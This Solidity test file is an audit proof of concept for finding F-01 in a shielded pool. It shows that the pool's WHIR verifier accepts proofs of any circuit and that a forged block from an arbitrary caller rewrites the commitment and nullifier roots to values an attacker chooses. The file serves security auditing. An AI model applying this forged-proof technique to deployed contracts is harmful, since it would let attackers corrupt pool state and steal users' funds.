// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {WhirVerifier} from "../../src/verifier/WhirVerifier.sol";
import {TerminalWeight} from "../../src/verifier/TerminalWeight.sol";
import {ShieldedPool} from "../../src/ShieldedPool.sol";

/// AUDIT PoC F-01: the deployed verifier accepts proofs of ANY circuit, because
/// the circuit description (CONFIG: preprocessed digest, degree bits, WHIR
/// schedules, constraint programs) travels inside the caller-supplied bundle
/// and is never compared with a pinned value. `applyBlock` is permissionless.
///
/// Vectors: test/vectors/audit/poc_f01_forged_{bundle.bin,block.json}, produced by
///   cargo test -p prover --test poc_audit_f01 -- --ignored --nocapture
/// from a circuit that exposes 87 free public inputs and verifies nothing.
contract PocF01ForgedBlockTest is Test {
    string internal constant FORGED = "test/vectors/audit/poc_f01_forged_block.json";
    string internal constant FORGED_BUNDLE = "test/vectors/audit/poc_f01_forged_bundle.bin";

    /// Precondition: one verifier instance (exactly what Deploy.s.sol deploys)
    /// accepts proofs of two unrelated circuits - the shielded block circuit and
    /// the Fibonacci recursion chain - using only the committed honest vectors.
    /// A verifier bound to one circuit must reject one of them.
    function test_poc_f01_one_verifier_accepts_two_unrelated_circuits() public {
        WhirVerifier verifier = new WhirVerifier(address(new TerminalWeight()));

        uint256[] memory blockStatement =
            vm.parseJsonUintArray(vm.readFile("test/vectors/block_genesis.json"), ".statement");
        assertTrue(
            verifier.verify(blockStatement, vm.readFileBinary("test/vectors/block_composed_bundle.bin")),
            "block circuit proof"
        );

        uint256[] memory fibStatement = vm.parseJsonUintArray(
            vm.readFile("test/vectors/recursion_chain_sidecar.json"), ".statement"
        );
        assertTrue(
            verifier.verify(fibStatement, vm.readFileBinary("test/vectors/recursion_chain_bundle.bin")),
            "fibonacci chain proof"
        );
    }

    /// Exploit: a proof of a statement-only circuit moves the pool to
    /// attacker-chosen commitment and nullifier roots, from an arbitrary caller.
    function test_poc_f01_forged_block_rewrites_pool_roots() public {
        string memory j = vm.readFile(FORGED);
        uint256[] memory statement = vm.parseJsonUintArray(j, ".statement");
        bytes32 genesisRoot = vm.parseJsonBytes32(j, ".genesis_root_hex");
        bytes32 forgedRoot = vm.parseJsonBytes32(j, ".forged_root_after");
        bytes32 forgedNf = vm.parseJsonBytes32(j, ".forged_nullifier_after");

        WhirVerifier verifier = new WhirVerifier(address(new TerminalWeight()));
        ShieldedPool pool = new ShieldedPool(verifier, address(0xB0B), genesisRoot, bytes32(0));

        address anyone = address(0xBAD);
        vm.prank(anyone);
        pool.applyBlock(statement, vm.readFileBinary(FORGED_BUNDLE));

        assertEq(pool.blockNumber(), 1, "forged block applied");
        assertEq(pool.currentRoot(), forgedRoot, "commitment root is attacker-chosen");
        assertEq(pool.currentNullifierRoot(), forgedNf, "nullifier root is attacker-chosen");
    }
}
